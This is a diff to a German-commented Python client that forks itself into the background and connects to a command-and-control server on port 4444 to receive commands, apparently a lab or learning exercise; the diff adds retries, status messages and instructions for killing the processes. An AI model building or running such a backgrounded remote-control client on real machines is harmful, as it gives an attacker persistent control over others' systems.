@@ -4,6 +4,19 @@ import os
 import sys
 import time
 
+"""
+Um die Client-Prozesse zu stoppen:
+
+1. Prozesse finden
+- pgrep -f client.py
+
+2. Prozesse beenden (dafür die Prozess Ids der oben ausgelesenen Prozesse verwenden)
+- kill PID PID1 ...
+- kill -9 PID PID1 ... (falls der normale kill Befehl nicht funktioniert)
+"""
+
+
+
 
 def deamonize():
     """Client im Hintergrund ausführen, indem der Prozess geforkt wird"""
@@ -26,13 +39,17 @@ def deamonize():
         print(f"[!] Second fork failed: {e}")
         sys.exit(1)
 
+    print("[*] Client läuft im Hintergrund")
+
 
 def connect_to_server():
     """Mit dem C2 Server verbinden und Befehle verarbeiten"""
+    print("[*] Versuche Verbindung zum C2 Server herzustellen...")
+    retries: int = 5
     while True:
         try:
             client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            client.connect(("172.17.0.1", 4444))  # Server IP einfügen
+            client.connect(("127.0.0.1", 4444))  # Server IP einfügen
             print(f"[*] Mit C2 Server verbunden")
             while True:
                 # Befehle vom Server erhalten
@@ -52,10 +69,20 @@ def connect_to_server():
         except Exception as e:
             print(f"[!] Connection Fehler: {e}")
             time.sleep(5)  # Nach 5 Sekunden erneut versuchen
+            if retries > 0:
+                retries -= 1
+            else:
+                sys.exit(0)
+
+
+
         finally:
+            print("[*] Verbindung zum C2 Server verloren ...")
             if client:
                 client.close()
 
 
 if __name__ == "__main__":
+    print("[*] Starte Client...")
     deamonize()  # Im Hintergrund ausführen
+    connect_to_server()
